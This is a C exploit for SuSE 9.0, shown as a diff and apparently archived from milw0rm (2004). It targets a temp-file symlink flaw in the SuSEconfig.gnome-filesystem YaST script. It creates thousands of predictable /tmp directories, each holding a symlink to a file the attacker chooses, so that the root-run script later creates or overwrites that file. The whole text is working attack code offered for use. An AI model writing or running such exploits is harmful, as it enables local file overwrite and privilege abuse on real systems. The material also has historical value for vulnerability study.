@@ -1,0 +1,56 @@
+ #include <stdio.h>  
+ #include <unistd.h>  
+ #include <string.h>  
+  
+ #define PATH "/tmp/tmp.SuSEconfig.gnome-filesystem."  
+ #define START 1  
+ #define END 33000  
+  
+ int main(int argc, char **argv)  
+ {  
+ int i;  
+ char buf[150];  
+  
+ printf("\tSuSE 9.0 YaST script 
+SuSEconfig.gnome-filesystem exploit\n");  
+ printf("\t-------------------------------------------------------------
+\n");  
+ printf("\tdiscovered and written by l0om 
+<l0om excluded org>\n");  
+ printf("\t WWW.EXCLUDED.ORG\n\n");  
+  
+ if(argc != 2) {  
+ printf("usage: %s <destination-file>\n",argv[0]);  
+ exit(0xff);  
+ }  
+  
+ printf("### hit enter to create or overwrite file %
+s: ",argv[1]); fflush(stdout);  
+ read(1, buf, 1); fflush(stdin);  
+  
+ umask(0000);  
+ printf("working\n\n");  
+ for(i = START; i < END; i++) {  
+ snprintf(buf, sizeof(buf),"%s%d",PATH,i);  
+ if(mkdir(buf,00777) == -1) {  
+ fprintf(stderr, "cannot creat directory [Nr.%d]
+\n",i);  
+ exit(0xff);  
+ }  
+ if(!(i%1000))printf(".");  
+ strcat(buf, "/found");  
+ if(symlink(argv[1], buf) == -1) {  
+ fprintf(stderr, "cannot creat symlink from %s to %s 
+[Nr.%d]\n",buf,argv[1],i);  
+ exit(0xff);  
+ }  
+ }  
+ printf("\ndone!\n");  
+ printf("next time the SuSE.gnome-filesystem script 
+gets executed\n");  
+ printf("we will create or overwrite file %s
+\n",argv[1]);  
+ return(0x00);  
+ }  /* i cant wait for the new gobbles comic!! */ 
+
+// milw0rm.com [2004-01-15]
